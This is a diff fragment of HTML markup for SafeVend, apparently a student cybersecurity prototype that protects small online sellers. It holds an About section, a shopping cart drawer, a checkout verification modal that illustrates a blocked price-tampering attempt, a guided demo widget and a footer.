+          <!-- Dynamically populated from SafeVendData.roadmap -->
+        </div>
+      </div>
+    </section>
+
+    <!-- ========================================================
+         PAGE 11: ABOUT & MISSION
+         ======================================================== -->
+    <section id="view-about" class="view-section">
+      <div class="container">
+        <div class="about-content-card">
+          <div class="hero-badge" style="margin-bottom: 1rem;">
+            <span>🎓 CEC CYBERSECURITY PROJECT</span>
+          </div>
+          <h3>Why SafeVend?</h3>
+          <p>
+            Small and home-based businesses should never have to choose between financial affordability and basic cybersecurity. When local artisans set up digital storefronts, they often operate on razor-thin margins. A single price tampering incident or card testing bot storm can wipe out their monthly profit and destroy consumer trust.
+          </p>
+          <p>
+            <strong>Our Mission:</strong> Make essential e-commerce security accessible to businesses that cannot afford dedicated cybersecurity teams, enterprise cloud contracts, or complex server administration.
+          </p>
+
+          <h4 style="font-size: 1.25rem; font-weight: 800; color: #ffffff; margin-top: 2rem;">Target Beneficiaries:</h4>
+          <div class="target-users-grid">
+            <div class="target-user-item">
+              <div class="icon">🧶</div>
+              <h5>Independent Artisans</h5>
+              <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">Handmade crafts, pottery &amp; textiles</p>
+            </div>
+            <div class="target-user-item">
+              <div class="icon">🏡</div>
+              <h5>Home Businesses</h5>
+              <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">Local bakers, jewelers &amp; candle makers</p>
+            </div>
+            <div class="target-user-item">
+              <div class="icon">🌿</div>
+              <h5>Sustainable Micro-Sellers</h5>
+              <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 4px;">Organic, eco-friendly, zero-waste products</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- ========================================================
+       SHOPPING CART OVERLAY & DRAWER
+       ======================================================== -->
+  <div class="cart-overlay" id="cart-drawer-overlay"></div>
+  <aside class="cart-drawer" id="cart-drawer-element" aria-label="Shopping Cart Drawer">
+    <div class="cart-header">
+      <h3>Shopping Cart (<span id="cart-item-count">1</span>)</h3>
+      <button class="cart-close-btn" id="btn-close-cart" aria-label="Close Shopping Cart">✕</button>
+    </div>
+    <div class="cart-items-list" id="cart-items-container">
+      <!-- Dynamically populated from cart state -->
+    </div>
+    <div class="cart-footer">
+      <div class="cart-security-badge-footer">
+        <span>🛡️</span>
+        <span>SafeVend Active: Cart prices verified against catalog</span>
+      </div>
+      <div class="cart-subtotal-row">
+        <span class="lbl">Subtotal</span>
+        <span class="val" id="cart-subtotal-display">₹999</span>
+      </div>
+      <button class="btn btn-primary" id="btn-proceed-to-checkout" style="width: 100%;">
+        <span>Proceed to Secure Checkout →</span>
+      </button>
+    </div>
+  </aside>
+
+  <!-- ========================================================
+       TRANSACTION SECURITY VERIFICATION MODAL
+       ======================================================== -->
+  <div class="security-verification-modal" id="verification-modal" role="dialog" aria-modal="true" aria-labelledby="verification-dialog-title">
+    <div class="verification-dialog">
+      <div class="verification-dialog-header">
+        <h3 id="verification-dialog-title">
+          <span>🛡️ SafeVend Security Pipeline</span>
+        </h3>
+        <span class="badge-sec badge-secure" id="verification-status-pill">Verifying...</span>
+      </div>
+      <div class="verification-steps-body">
+        <div class="pipeline-steps-list">
+          <div class="pipeline-step-item pending" id="step-pipe-1">
+            <span class="step-indicator">1</span>
+            <span class="step-label">1. Validating customer form inputs &amp; format integrity...</span>
+          </div>
+          <div class="pipeline-step-item pending" id="step-pipe-2">
+            <span class="step-indicator">2</span>
+            <span class="step-label">2. Checking DOM &amp; checkout form structure...</span>
+          </div>
+          <div class="pipeline-step-item pending" id="step-pipe-3">
+            <span class="step-indicator">3</span>
+            <span class="step-label">3. Verifying product catalog price integrity...</span>
+          </div>
+          <div class="pipeline-step-item pending" id="step-pipe-4">
+            <span class="step-indicator">4</span>
+            <span class="step-label">4. Evaluating automated bot request velocity...</span>
+          </div>
+          <div class="pipeline-step-item pending" id="step-pipe-5">
+            <span class="step-indicator">5</span>
+            <span class="step-label">5. Generating cryptographic state &amp; status...</span>
+          </div>
+        </div>
+
+        <!-- Outcome: Legitimate / Verified -->
+        <div class="verification-outcome-box verified-box" id="outcome-verified-box">
+          <div class="outcome-title-row">
+            <span style="font-size: 1.75rem;">✓</span>
+            <h4>TRANSACTION VERIFIED</h4>
+          </div>
+          <p style="color: #cbd5e1; font-size: 0.9rem;">
+            All security checks passed. Product catalog price matches submitted total, inputs are sanitized, and transaction checksum is signed.
+          </p>
+          <div class="checksum-info-strip" id="verified-checksum-text">
+            HMAC-SHA256: SV-HMAC-256-4D2A91F-C30B
+          </div>
+          <div style="margin-top: 1.25rem; display: flex; gap: 10px;">
+            <button class="btn btn-safe btn-sm" id="btn-close-verified-modal">Done / Return</button>
+            <a href="#dashboard" class="btn btn-secondary btn-sm" id="btn-view-dash-from-verified">View in Dashboard</a>
+          </div>
+        </div>
+
+        <!-- Outcome: Threat / Tampered Blocked -->
+        <div class="verification-outcome-box threat-box" id="outcome-threat-box">
+          <div class="outcome-title-row">
+            <span style="font-size: 1.75rem;">🚨</span>
+            <h4 id="threat-outcome-title">TRANSACTION BLOCKED</h4>
+          </div>
+          <p style="color: #fecaca; font-size: 0.9rem;" id="threat-outcome-desc">
+            SafeVend detected an integrity anomaly during checkout.
+          </p>
+
+          <!-- Before/After Attack Visual Comparison -->
+          <div class="price-tamper-visual-diff" id="visual-diff-container">
+            <div class="price-diff-node">
+              <div class="lbl">Catalog Price</div>
+              <div class="val expected" id="diff-expected-val">₹999.00</div>
+            </div>
+            <div class="price-diff-arrow">→</div>
+            <div class="price-diff-node">
+              <div class="lbl">Tampered Price</div>
+              <div class="val tampered" id="diff-tampered-val">₹0.01</div>
+            </div>
+            <div class="price-diff-arrow">→</div>
+            <div class="price-diff-node">
+              <div class="lbl">Defense Action</div>
+              <div class="val" style="color: #f87171;">✕ BLOCKED</div>
+            </div>
+          </div>
+
+          <div style="margin-top: 1.25rem; display: flex; gap: 10px;">
+            <a href="#dashboard" class="btn btn-danger btn-sm" id="btn-view-dash-from-threat">
+              <span>View Alert in Merchant Dashboard →</span>
+            </a>
+            <button class="btn btn-secondary btn-sm" id="btn-close-threat-modal">Dismiss</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========================================================
+       FORENSIC THREAT DETAILS MODAL
+       ======================================================== -->
+  <div class="threat-modal" id="threat-detail-modal" role="dialog" aria-modal="true" aria-labelledby="threat-modal-title">
+    <div class="threat-dialog">
+      <div class="threat-dialog-header">
+        <h3 id="threat-modal-title">
+          <span>🚨 Threat Forensic Inspection</span>
+        </h3>
+        <button class="btn btn-sm" id="btn-close-threat-detail" style="color: var(--text-muted); font-size: 1.25rem;">✕</button>
+      </div>
+      <div class="threat-dialog-body" id="threat-detail-content">
+        <!-- Dynamically rendered when an alert is clicked -->
+      </div>
+    </div>
+  </div>
+
+  <!-- ========================================================
+       7-MINUTE GUIDED PRESENTATION DEMO TOAST WIDGET
+       ======================================================== -->
+  <aside class="presentation-guide-toast" id="presentation-guide-widget" aria-label="Interactive Presentation Tour">
+    <div class="guide-toast-header">
+      <span class="guide-step-tag" id="guide-step-counter">STEP 1 OF 6</span>
+      <button class="btn btn-sm" id="btn-close-guide" style="color: var(--text-muted); padding: 0;">✕</button>
+    </div>
+    <div class="guide-step-text" id="guide-step-instruction">
+      Welcome to SafeVend! Click "Next" to walk through the 7-minute college cybersecurity presentation demonstration.
+    </div>
+    <div class="guide-actions-row">
+      <button class="btn btn-secondary btn-sm" id="btn-guide-prev">← Back</button>
+      <button class="btn btn-primary btn-sm" id="btn-guide-next">Next Step →</button>
+    </div>
+  </aside>
+
+  <!-- MAIN FOOTER -->
+  <footer class="main-footer">
+    <div class="footer-container">
+      <div class="footer-academic-info">
+        <strong>SafeVend</strong> — Academic CEC Cybersecurity Project Prototype.<br>
+        Designed for micro-merchants &amp; small online sellers. Built with HTML5, CSS3, &amp; Vanilla JavaScript.
+      </div>
+      <div class="footer-links">
+        <a href="#home">Home</a>
+        <a href="#store">CraftNest Store</a>
+        <a href="#checkout">Checkout Demo</a>
+        <a href="#dashboard">Security Center</a>
+        <a href="#research">Literature Review</a>
+        <a href="#about">About</a>
+      </div>
+    </div>
+  </footer>
+
+  <!-- SCRIPT INCLUDES -->
+  <script src="js/data.js"></script>
+  <script src="js/security.js"></script>
+  <script src="js/app.js"></script>
+</body>
+</html>
